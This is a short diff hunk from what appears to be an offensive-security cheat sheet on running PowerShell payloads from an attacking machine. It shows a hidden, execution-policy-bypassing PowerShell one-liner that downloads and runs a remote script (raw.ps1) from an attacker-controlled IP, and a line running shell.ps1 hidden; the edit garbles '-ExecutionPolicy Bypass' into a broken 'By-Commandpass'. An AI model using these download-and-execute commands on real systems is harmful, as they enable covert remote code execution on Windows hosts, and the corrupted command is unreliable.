@@ -72,7 +72,7 @@ Launch the above script directly or save on local attacking maching and call it 
 
 `powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/raw.ps1')"`
 
-`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File shell.ps1`
+`powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy By-Commandpass -File shell.ps1`
 
 ### Encoded POwershell Execution
 
